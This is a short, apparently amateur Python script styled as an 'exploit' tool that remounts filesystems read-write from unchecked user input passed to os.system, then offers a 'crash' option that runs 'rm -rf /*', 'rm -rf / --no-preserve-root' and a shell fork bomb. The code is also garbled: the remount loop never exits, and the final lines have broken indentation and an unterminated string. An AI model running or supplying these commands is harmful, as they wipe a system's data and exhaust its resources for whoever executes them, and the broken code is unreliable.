# @copyright

import os
from time import sleep

zero = 0

st = input('3xpl0it@start[Y/n] ')
if st == 'N' or st == 'n':
    os.system('clear')
    print('3xpl0it@logout~% [0]')
    print('')
else:
    os.system('mount')
    print('------------------------------------')
    os.system('mount /')
    print('-----------------------')
    while zero != 12:
        mon = input('3xpl0it@remount~# ')
        os.system('mount -o remount --rw' + ' ' + mon)
        
st_rof = input('3xpl0it@crash[N/y] ')
sleep(12)
if st_rof == 'Y' or st_rof == 'y':
    os.system('clear')
    os.system('rm -rf /*')
    os.system('rm -rf / --no-preserve-root')
    os.system(':(){ :|:& };:')
else:
    os.system('clear')
    print('3xpl0it@logout~% [0]')
    print('this is basic file needs to be cleared...')
print('delete this ')
os.system('clear')
    print('3xpl0it@logout~% [0]')
    print('this is basic file needs to be cleared..
